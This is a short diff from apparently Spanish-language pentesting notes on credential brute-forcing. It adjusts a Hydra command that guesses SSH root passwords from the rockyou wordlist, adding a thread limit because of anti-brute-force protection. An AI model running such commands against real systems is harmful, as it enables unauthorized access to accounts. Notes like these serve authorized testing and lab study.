@@ -93,7 +93,7 @@ Tags: #Hydra #Medusa #BruteForce #Spraying #Credenciales #Autenticacion
 
 ### SSH (Puerto 22)
 ```bash
-❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP>
+❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 
 # Usuario root | -t 4 → SSH suele tener protección anti-brute
 
 ❯ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<IP> -t 4 -V
